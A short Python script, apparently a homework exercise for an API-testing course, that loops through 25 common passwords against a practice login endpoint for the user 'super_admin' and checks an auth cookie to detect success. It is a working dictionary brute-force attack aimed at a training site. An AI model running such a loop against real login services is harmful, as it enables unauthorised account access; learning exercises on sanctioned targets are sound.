import requests

the_worst_passwords_list = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou',
                            '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321',
                            '555555', 'lovely', '7777777', 'welcome', '888888', 'princess', 'dragon', 'password1',
                            '123qwe']


def test_password():
    for password in the_worst_passwords_list:
        response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                 data={"login": 'super_admin', "password": password})
        check_auth_response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                            cookies={'auth_cookie': response.cookies.get('auth_cookie')})
        if check_auth_response.text == 'You are authorized':
            print('Response text: {0}. Your password: {1}'.format(check_auth_response.text, password))
            break
